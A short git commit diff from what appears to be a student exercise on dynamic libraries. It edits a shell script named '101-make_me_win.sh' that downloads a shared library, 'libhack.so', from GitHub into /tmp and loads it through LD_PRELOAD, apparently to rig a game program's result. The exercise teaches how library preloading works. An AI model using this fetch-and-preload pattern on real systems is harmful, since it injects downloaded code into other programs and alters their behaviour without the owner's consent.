be0f849ef55d7cbfe73c22fc47634828016074dc
PimehT <tareerepimeh@gmail.com>
2023-11-13 13:53:06 -0800

    0x18-dynamic_libraries

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 wget -P /tmp https://github.com/PimehT/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libhack.so
-export LD_PRELOAD=./libhack.so
+export LD_PRELOAD=/tmp/libhack.so
